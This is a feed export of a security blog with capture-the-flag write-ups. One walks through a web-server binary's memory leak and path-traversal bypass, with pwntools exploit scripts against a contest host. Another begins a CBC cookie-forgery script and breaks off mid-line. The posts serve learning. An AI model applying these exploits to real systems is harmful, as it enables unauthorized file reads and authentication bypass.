<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    
    <title><![CDATA[Hc1m1]]></title>
    <link>http://0x48.pw//</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    <description><![CDATA[水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会]]></description>
    <pubDate>Mon, 27 Jun 2016 06:35:38 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title><![CDATA[寻找来自星星的你第二期Writeup]]></title>
      <link>http://0x48.pw/2016/06/27/0x1D/</link>
      <guid>http://0x48.pw/2016/06/27/0x1D/</guid>
      <pubDate>Mon, 27 Jun 2016 12:11:37 GMT</pubDate>
      <description>
      <![CDATA[<p>三个白帽之寻找来自星星的你第二期WP，这期的题目我觉得应该放在Linux逆向分类中…</p>]]>
      
      </description>
      <content:encoded><![CDATA[<p>三个白帽之寻找来自星星的你第二期WP，这期的题目我觉得应该放在Linux逆向分类中…</p>
<a id="more"></a>
<p>本题的入口在<code>sub_401B08</code>函数，不过对解本题没啥帮助，所以可以跳到子进程的入口点<code>sub_4014D3</code>, 所以我们应该从该函数看起.</p>
<figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="params">( !strncasecmp<span class="params">(::s1, <span class="string">"GET /server.bin"</span>, <span class="number">0</span>xFuLL)</span> )</span></span><br><span class="line">&#123;</span><br><span class="line">	file = <span class="string">"/server.bin"</span>;</span><br><span class="line">	v11 = <span class="params">(__int64)</span><span class="string">"image/bin"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个判断，也就是下载本题二进制文件，没啥好说的，主要是从后面开始有几个重要的判断，首先<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( strncasecmp(::s1, <span class="string">"GET"</span>, <span class="number">3u</span>LL) )</span><br><span class="line">	sub_40133B(<span class="number">2</span>, <span class="number">4202955L</span>L, <span class="number">4202720L</span>L, a1);</span><br><span class="line"><span class="comment">// 输入的前三个字符串要是GET，不区分大小写</span></span><br></pre></td></tr></table></figure></p>
<p>PS: 这里注意下，<code>sub_40133B</code> 函数的第一个参数为<code>2</code>，则是执行报错退出.</p>
<p>接下来<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qword_606248 = <span class="params">(__int64)</span>strstr<span class="params">(::s1, <span class="string">"HTTP/1.0"</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( !qword_606248 )</span></span><br><span class="line">&#123;</span><br><span class="line">	qword_606248 = <span class="params">(__int64)</span>strstr<span class="params">(::s1, <span class="string">"HTTP/1.1"</span>)</span>;</span><br><span class="line">	<span class="keyword">if</span> <span class="params">( !qword_606248 )</span></span><br><span class="line">		sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4202929</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后传入的参数要存在<code>HTTP/1.0</code>或者<code>HTTP/1.1</code>字符串.</p>
<p>接下来就是第一步的关键点了,<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">haystack = strstr<span class="params">(::s1, <span class="string">"Cookie: "</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( !haystack )</span></span><br><span class="line">	sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4202908</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br><span class="line">s = strstr<span class="params">(haystack, <span class="string">"auth="</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( !s )</span></span><br><span class="line">	sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">0</span>x4021E6LL, <span class="number">0</span>x4020E0LL, a1)</span>;</span><br><span class="line">sa = <span class="params">(__int64)</span><span class="params">(s + <span class="number">5</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( strlen<span class="params">(<span class="params">(const char *)</span>sa)</span> &gt; <span class="number">0</span>x40 )</span></span><br><span class="line">	sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4203002</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br><span class="line">sub_400F12<span class="params">(<span class="params">(__int64)</span>&amp;s1, sa)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( memcmp<span class="params">(&amp;s1, s2, <span class="number">0</span>x20uLL)</span> )</span></span><br><span class="line">	sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4203032</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br></pre></td></tr></table></figure></p>
<p>我们需传入Cookie参数，格式是<code>Cookie: auth=xxxxx</code>， xxxxx的长度不能大于0x40, 然后把sa传入<code>sub_400F12</code>函数， 进行一系列迷之处理后，赋值到s1，然后和s2比较前0x20个byte.</p>
<p>s2是啥？s2是传入<code>sub_4014D3</code>的第三个参数，来溯源一下<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">sub_4014D3</span><br><span class="line"></span><span class="label">void</span> __fastcall __noreturn <span class="keyword">sub_4014D3(unsigned </span>int <span class="literal">a1</span>, unsigned int <span class="literal">a2</span>, const void *<span class="literal">a3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="label">...</span></span><br><span class="line"><span class="label">s2</span> = <span class="literal">a3</span><span class="comment">;</span></span><br><span class="line"><span class="label">...</span></span><br><span class="line">//<span class="keyword">sub_401B08</span><br><span class="line"></span><span class="label">...</span></span><br><span class="line"><span class="keyword">sub_401125("../server.cfg", </span>&amp;v11)<span class="comment">;</span></span><br><span class="line"><span class="label">...</span></span><br><span class="line"><span class="keyword">sub_4014D3(v9, </span>i, &amp;v11)<span class="comment">;</span></span><br><span class="line">//<span class="keyword">sub_401125</span><br><span class="line"></span><span class="label">int</span> __fastcall <span class="keyword">sub_401125(const </span>char *<span class="literal">a1</span>, char *<span class="literal">a2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *<span class="keyword">stream; </span>// [<span class="literal">sp</span>+<span class="number">20</span>h] [<span class="keyword">bp-10h]@1</span><br><span class="line"></span>  char *<span class="literal">v4</span><span class="comment">; // [sp+28h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">stream </span>= fopen(<span class="literal">a1</span>, <span class="string">"r"</span>)<span class="comment">;</span></span><br><span class="line">  fgets(<span class="literal">a2</span>, <span class="number">32</span>, <span class="keyword">stream);</span><br><span class="line"></span>  <span class="literal">v4</span> = <span class="keyword">strpbrk(a2, </span><span class="string">"\r\n"</span>)<span class="comment">;</span></span><br><span class="line">  <span class="preprocessor">if</span> ( <span class="literal">v4</span> )</span><br><span class="line">    *<span class="literal">v4</span> = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">  return fclose(<span class="keyword">stream);</span><br><span class="line"></span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>s2为<code>../server.cfg</code>文件中的前32bytes字符串，属于未知，本题的第一步就是想办法得到s2的值或者绕过cookie认证.</p>
<p>之后在报错退出的方法中看到一个函数<code>sub_401195</code><br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">sub_40133B</span><br><span class="line"></span><span class="label">else</span> <span class="preprocessor">if</span> ( <span class="literal">a1</span> == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">sub_401195(v10, </span><span class="number">0x194</span>u, <span class="number">0x4020E0</span>LL)<span class="comment">;</span></span><br><span class="line">    sprintf(s, <span class="string">"&lt;HTML&gt;&lt;BODY&gt;&lt;H1&gt;WebServer: %s %s&lt;/H1&gt;&lt;/BODY&gt;&lt;/HTML&gt;"</span>, <span class="literal">a2</span>, v9)<span class="comment">;</span></span><br><span class="line">    <span class="literal">v6</span> = <span class="keyword">strlen(s);</span><br><span class="line"></span>    <span class="keyword">sub_4012E7(v10, </span>s, <span class="literal">v6</span>)<span class="comment">;</span></span><br><span class="line">    sprintf(s, <span class="string">"SORRY: %s-%s"</span>, <span class="literal">a2</span>, v9)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">//<span class="keyword">sub_401195</span><br><span class="line"></span><span class="label">v4</span> = snprintf(&amp;s, <span class="number">0x100</span>uLL, <span class="string">"%s %d %s\r\n"</span>, <span class="literal">v3</span>, <span class="literal">a2</span>, <span class="literal">a3</span>)<span class="comment">;</span></span><br><span class="line"><span class="label">result</span> = write(fd, &amp;s, <span class="literal">v4</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>通过google查找snprintf文档发现，该函数的功能我用python来表达下<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">tmp</span> = <span class="string">"%s %d %s\r\n"</span>%(<span class="literal">v3</span>, <span class="literal">a2</span>, <span class="literal">a3</span>)</span><br><span class="line">s = tmp[:<span class="number">0x100</span>]</span><br><span class="line"><span class="label">v4</span> = len(tmp)</span><br></pre></td></tr></table></figure></p>
<p>问题就出在这了，v4的值为<code>len(tmp)</code>而不是<code>len(s)</code>.<br>这里的v3是可控的，所以我们可以通过控制v3来控制v4的值，然后通过<code>result = write(fd, &amp;s, v4);</code><br>泄露内存，做到这，第一步的思路已经很明了了，就是通过内存泄露来获取s2的值</p>
<p>通过本地调试，发现<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffe453</span> <span class="number">2f</span>fb0 <span class="comment">//s的地址</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x7ffe453</span> <span class="number">30210</span> <span class="comment">//s2的地址</span></span><br></pre></td></tr></table></figure></p>
<p>接下来就简单了，直接贴payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r = remote(<span class="string">'123.59.56.23'</span>, <span class="number">43481</span>)</span><br><span class="line">payload = <span class="string">'GET /tmp/a\nHTTP/1.0'</span> + <span class="string">'g'</span>*(<span class="number">608</span>+<span class="number">3</span>) + <span class="string">'Cookie: auth=x\n'</span></span><br><span class="line">r.send(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	r.recv()</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/baimao1.png" alt="baimao"><br>得到<code>../server.cfg</code>中32bytes的内容.</p>
<p>接下来就是分析<code>sub_400F12</code>函数，发现是一个base64decode函数，那就简单了，把这32bytes内容进行base64编码后加入cookie中. </p>
<p>进入下一步，继续代码<br>代码贴出来分析<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">	<span class="keyword">for</span> <span class="params">( i = <span class="number">0</span>LL; i &lt; <span class="params">(signed __int64)</span>n; ++i )</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( *<span class="params">(_BYTE *)</span><span class="params">(i + <span class="number">0</span>x605240)</span> == <span class="number">0</span>xD || *<span class="params">(_BYTE *)</span><span class="params">(i + <span class="number">0</span>x605240)</span> == <span class="number">0</span>xA )</span></span><br><span class="line">		<span class="built_in">*</span><span class="params">(_BYTE *)</span><span class="params">(i + <span class="number">0</span>x605240)</span> = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// \n和\r都会转换成\0</span></span><br><span class="line">....</span><br><span class="line">	file = <span class="params">(char *)</span>&amp;unk_605244;</span><br><span class="line">	v8 = strlen<span class="params">(<span class="params">(const char *)</span>&amp;unk_605244)</span>;</span><br><span class="line">	v15 = <span class="number">0</span>LL;</span><br><span class="line">	while <span class="params">( v8 &gt; v15 &amp;&amp; isspace<span class="params">(file[v15])</span> )</span></span><br><span class="line">	&#123;</span><br><span class="line">		++v15;</span><br><span class="line">		++file;</span><br><span class="line">	&#125; <span class="comment">// 去除开头的空格</span></span><br><span class="line">	<span class="keyword">for</span> <span class="params">( j = <span class="number">0</span>LL; ; ++j )</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( strlen<span class="params">(file)</span> &lt;= j )</span></span><br><span class="line">			goto LABEL_38;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( isspace<span class="params">(file[j])</span> )</span></span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">	file[j] = <span class="number">0</span>; <span class="comment">//把遇到的第一个空格转换成\0</span></span><br><span class="line">LABEL_38:</span><br><span class="line">	v9 = strlen<span class="params">(file)</span>;</span><br><span class="line">	<span class="keyword">for</span> <span class="params">( k = <span class="number">0</span>; k &lt; v9; ++k )</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( file[k] == <span class="number">0</span>x2E &amp;&amp; file[k + <span class="number">1</span>] == <span class="number">0</span>x2E )</span></span><br><span class="line">			sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4203054</span>LL, <span class="params">(__int64)</span>file, a1)</span>; </span><br><span class="line">	&#125; <span class="comment">// file中不能存在连续的0x2E(.)字符</span></span><br><span class="line">	v11 = <span class="number">0</span>LL;</span><br><span class="line">	<span class="keyword">for</span> <span class="params">( l = <span class="number">0</span>LL; ; ++l )</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( !off_603160[<span class="number">2</span> * l] )</span></span><br><span class="line">			goto LABEL_49;</span><br><span class="line">		v3 = <span class="params">(signed int)</span>strlen<span class="params">(off_603160[<span class="number">2</span> * l])</span>;</span><br><span class="line">		v4 = off_603160[<span class="number">2</span> <span class="built_in">*</span> l];</span><br><span class="line">		v5 = strlen<span class="params">(file)</span>;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( !strncmp<span class="params">(&amp;file[v5 - v3], v4, v3)</span> )</span></span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">	v11 = <span class="params">(__int64)</span>off_603160[<span class="number">2</span> <span class="built_in">*</span> l + <span class="number">1</span>]; <span class="comment">//后缀判断</span></span><br><span class="line">LABEL_49:</span><br><span class="line">	<span class="keyword">if</span> <span class="params">( !v11 )</span></span><br><span class="line">		sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4203080</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br><span class="line">&#125;</span><br><span class="line">filea = <span class="params">(__int64)</span><span class="params">(file + <span class="number">1</span>)</span>;</span><br><span class="line">v10 = open<span class="params">(<span class="params">(const char *)</span>filea, <span class="number">0</span>, s2)</span>;</span><br></pre></td></tr></table></figure></p>
<p>后缀判断:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x401f20</span>:	<span class="string">"gif"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f24</span>:	<span class="string">"image/gif"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f2e</span>:	<span class="string">"jpg"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f32</span>:	<span class="string">"image/jpeg"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f3d</span>:	<span class="string">"png"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f41</span>:	<span class="string">"image/png"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f4b</span>:	<span class="string">"htm"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f4f</span>:	<span class="string">"text/html"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f59</span>:	<span class="string">"xml"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f5d</span>:	<span class="string">"text/xml"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f66</span>:	<span class="string">"tz"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f69</span>:	<span class="string">"image/gz"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f72</span>:	<span class="string">"js"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f75</span>:	<span class="string">"text/js"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f7d</span>:	<span class="string">"css"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f81</span>:	<span class="string">"text/css"</span></span><br><span class="line"><span class="comment">// 允许的后缀有8个: git, jpg, png, htm, xml, tz, js, css</span></span><br></pre></td></tr></table></figure></p>
<p>根据上面的注释，我们一个一个的bypass限制，先来看看怎么bypass <code>..</code>的限制，<br>来看这句代码<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filea = <span class="list">(<span class="keyword">__int64</span>)</span><span class="list">(<span class="keyword">file</span> + <span class="number">1</span>)</span><span class="comment">;</span></span><br><span class="line">v10 = open<span class="list">(<span class="list">(<span class="keyword">const</span> char <span class="variable">*)filea, 0, s2);</span></span></span></span><br></pre></td></tr></table></figure></p>
<p>最后打开的路径为filea，如果filea中存在<code>..</code>而file中不存在<code>..</code>不就可以绕过了吗？而<code>filea=file+1</code>, 所以这就存在一种情况，<br><code>file=\0../xxx</code> -&gt; <code>filea=../xxx</code><br>所以，<code>strlen(file) == 0</code>,从而bypass这段代码:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v9 = strlen<span class="list">(<span class="keyword">file</span>)</span><span class="comment">;</span></span><br><span class="line">for <span class="list">( <span class="keyword">k</span> = <span class="number">0</span><span class="comment">; k &lt; v9; ++k )</span></span><br><span class="line">&#123;</span><br><span class="line">	if <span class="list">( <span class="keyword">file</span>[k] == <span class="number">0</span>x2E <span class="keyword">&amp;&amp;</span> file[k + <span class="number">1</span>] == <span class="number">0</span>x2E )</span></span><br><span class="line">		sub_40133B<span class="list">(<span class="number">2</span>, <span class="number">4203054</span>LL, <span class="list">(<span class="keyword">__int64</span>)</span>file, a1)</span><span class="comment">; </span></span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>接下来就想想如何bypass后缀名，<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !off_603160[2 * <span class="keyword">l</span>] )</span><br><span class="line">	goto LABEL_49;</span><br><span class="line">v3 = (signed int)<span class="literal">strlen</span>(off_603160[2 * <span class="keyword">l</span>]);</span><br><span class="line">v4 = off_603160[2 * <span class="keyword">l</span>];</span><br><span class="line">v5 = <span class="literal">strlen</span>(<span class="keyword">file</span>);</span><br><span class="line"><span class="keyword">if</span> ( !strncmp(&amp;<span class="keyword">file</span>[v5 - v3], v4, v3) )</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
<p>这串是后缀判断的代码，按照前面bypass<code>..</code>的情况，<code>v5=0</code>, <code>v3 == 2 || v3 == 3</code>, 所以进行比较的字符串为<code>file[-2] || file[-3]</code></p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span> = (<span class="built_in">char</span> *)&amp;unk_605244;</span><br></pre></td></tr></table></figure>
<p>所以我们可以构造出一个payload:<code>getz\n../xxx</code> (PS: <code>\0</code>需要通过<code>\n</code>或者<code>\r</code>进行转换)<br>那么我们可以得到：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">file</span> = <span class="string">"\0../xxx"</span></span><br><span class="line"><span class="type">file</span>[<span class="number">1</span>:] = <span class="string">"../xxx"</span></span><br><span class="line"><span class="type">file</span>[-<span class="number">2</span>] = <span class="string">"tz"</span></span><br></pre></td></tr></table></figure></p>
<p>完美绕过所以判断，可以进行任意文件读取，payload：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r = remote(<span class="string">'123.59.56.23'</span>, <span class="number">43481</span>)</span><br><span class="line">payload = <span class="string">"GEtz\n../server.cfg\nHTTP/1.0 Cookie: auth=BAjSrP9/AABm7NKs/38AAFgE0qz/fwAAEsjSrP9/AAA"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	r.recv()</span><br></pre></td></tr></table></figure></p>
<p>flag就在<code>../server.cfg</code>文件中</p>
<p>做完这题后发现自己的逆向能力还是太差了，以后多做写逆向题….</p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/06/27/0x1D/#disqus_comments</comments>
    </item>
    
    <item>
      <title><![CDATA[三个白帽之招聘又开始了，你怕了吗？-Writeup]]></title>
      <link>http://0x48.pw/2016/06/17/0x1C/</link>
      <guid>http://0x48.pw/2016/06/17/0x1C/</guid>
      <pubDate>Fri, 17 Jun 2016 07:14:27 GMT</pubDate>
      <description>
      <![CDATA[<p>这周的三个白帽题听说是前几天ALICTF的招聘题延续，上次两题都没撸出来，这次给了源码终于撸出来了。<br>]]>
      
      </description>
      <content:encoded><![CDATA[<p>这周的三个白帽题听说是前几天ALICTF的招聘题延续，上次两题都没撸出来，这次给了源码终于撸出来了。<br><a id="more"></a></p>
<p>该渗透题有三个大坑</p>
<h1 id="坑1:_CBC攻击">坑1: CBC攻击</h1><p>很简单的CBC攻击，上次google ctf中出现过，我也写过wp:<a href="http://0x48.pw/2016/05/03/0x1A/">http://0x48.pw/2016/05/03/0x1A/</a></p>
<p>直接贴脚本吧：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck_captcha</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">10000000</span>):</span><br><span class="line">		y = hashlib.md5(str(x)).hexdigest()</span><br><span class="line">		<span class="keyword">if</span> y[:<span class="number">4</span>] == s:</span><br><span class="line">			<span class="keyword">return</span> str(x)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"God personality.(%s)"</span> %s</span><br><span class="line">	exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://451bf8ea3268360ee.jie.sangebaimao.com/login.php"</span></span><br><span class="line">url2 = <span class="string">"http://451bf8ea3268360ee.jie.sangebaimao.com"</span></span><br><span class="line"></span><br><span class="line">req = requests.get(url)</span><br><span class="line"></span><br><span class="line">c = req.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">";"</span>)[<span class="number">0</span>]</span><br><span class="line">c = c.split(<span class="string">"="</span>)</span><br><span class="line">cookie = &#123;c[<span class="number">0</span>]: c[<span class="number">1</span>]&#125;</span><br><span class="line"></span><br><span class="line">cap = re.findall(<span class="string">"=([a-f0-9]&#123;4&#125;)"</span>, req.content)[<span class="number">0</span>]</span><br><span class="line">captcha = fuck_captcha(cap)</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"username"</span>: <span class="string">"ddmin"</span>, <span class="string">"password"</span>: <span class="string">"ddog"</span>, <span class="string">"captcha"</span>: captcha&#125;</span><br><span class="line">req = requests.post(url, data=data, cookies=cookie, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">c = req.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line"></span><br><span class="line">user = c.split(<span class="string">"="</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">u = user.replace(<span class="string">"-"</span>, <span class="string">"+"</span>).replace(<span class="string">"_"</span>, <span class="string">"/"</span>)</span><br><span class="line">u += <span class="string">"="</span> * (len(u) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">de = base64.b64decode(u)</span><br><span class="line">de2 = chr(ord(de[<span class="number">0</span>]) 